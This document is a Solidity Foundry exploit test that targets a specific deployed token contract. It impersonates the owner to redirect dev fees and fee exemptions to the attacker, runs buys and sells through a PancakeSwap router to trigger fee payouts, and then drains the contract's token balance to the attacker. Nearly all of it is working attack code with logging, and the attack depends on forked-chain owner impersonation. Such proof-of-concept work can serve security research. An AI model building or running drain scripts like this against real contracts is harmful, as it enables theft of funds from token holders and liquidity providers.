contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    IxenoX token;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IxenoX(TARGET);

        // Get owner address
        address owner = token.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "xenoX Token");

        // Give attacker some ETH to start
        attacker = address(this);
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract instance and owner
        IxenoX token = IxenoX(TARGET);
        address owner = token.owner();
        IPancakeRouter02 router = IPancakeRouter02(token.pancakeRouter());
        address weth = router.WETH();
        address pair = token.pancakePair();

        console.log("Owner:", owner);
        console.log("Attacker:", attacker);
        console.log("Initial attacker ETH:", address(attacker).balance);

        // Step 2: Check if we need to add liquidity
        uint256 pairTokenBalance = token.balanceOf(pair);
        console.log("Pair token balance:", pairTokenBalance);

        // Step 3: Impersonate owner to set up exploit
        vm.startPrank(owner);

        // Set dev address to attacker to receive ETH
        token.setdevAddress(payable(attacker));
        console.log("Set dev address to attacker");

        // Also exclude attacker from fees to maximize profit
        token.excludeFromFee(attacker);
        console.log("Excluded attacker from fees");

        // If no liquidity, add some
        if (pairTokenBalance == 0) {
            console.log("Adding liquidity...");

            // Owner needs to approve tokens first
            // Check owner's actual balance (might have some via reflection)
            uint256 ownerRBalance = 0; // We'd need to check _rOwned but it's private

            // Instead, let's check if owner can transfer at least some tokens
            // We'll try to add 1 ETH worth of liquidity
            // First, owner needs to have ETH - we'll give them some
            deal(owner, 10 ether);

            // Approve router
            token.approve(address(router), type(uint256).max);

            // Add liquidity - use small amounts
            router.addLiquidityETH{value: 1 ether}(
                TARGET,
                1000000 * 10 ** 9, // 1M tokens
                0,
                0,
                owner,
                block.timestamp
            );
            console.log("Liquidity added");
        }

        vm.stopPrank();

        // Step 4: Buy tokens to generate fees
        console.log("Buying tokens to generate fees...");

        // Give attacker more ETH for buying
        deal(attacker, 100 ether);

        // Buy tokens multiple times to accumulate fees in contract
        // We need to generate at least numTokensSellToAddToLiquidity = 10,000 tokens in contract
        // With 6% total fee (1% tax + 3% liquidity + 2% dev), we need to buy:
        // 10,000 / 0.06 = ~166,667 tokens
        // But we also need to account for reflection system...

        // Let's buy a significant amount
        uint256 buyAmount = 20 ether;
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // First, check contract balance before
        token.balanceOf(TARGET);

        // Buy tokens
        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0,
            path,
            attacker,
            block.timestamp
        );

        console.log("Bought tokens");

        // Check contract balance after
        uint256 contractTokenBalance = token.balanceOf(TARGET);
        console.log("Contract token balance after buy:", contractTokenBalance);

        // Step 5: If contract has enough tokens, swapAndLiquify should trigger automatically
        // But we can also sell tokens to trigger it (from != pancakePair triggers swapAndLiquify)
        if (contractTokenBalance > 0) {
            console.log("Selling some tokens to trigger swapAndLiquify...");

            // Sell a small amount
            uint256 sellAmount = token.balanceOf(attacker) / 10;
            if (sellAmount > 0) {
                token.approve(address(router), sellAmount);

                address[] memory sellPath = new address[](2);
                sellPath[0] = TARGET;
                sellPath[1] = weth;

                vm.prank(attacker);
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    sellAmount,
                    0,
                    sellPath,
                    attacker,
                    block.timestamp
                );

                console.log("Sold tokens, should have triggered swapAndLiquify");
            }
        }

        // Step 6: Check if attacker received ETH as dev address
        console.log("Final attacker ETH balance:", address(attacker).balance);

        // Step 7: Also try to drain any remaining tokens in contract using transferTokens
        vm.startPrank(owner);
        contractTokenBalance = token.balanceOf(TARGET);
        if (contractTokenBalance > 0) {
            console.log("Draining remaining contract tokens:", contractTokenBalance);
            token.transferTokens(attacker, contractTokenBalance);
        }
        vm.stopPrank();

        // Final check
        console.log("Exploit complete");
    }

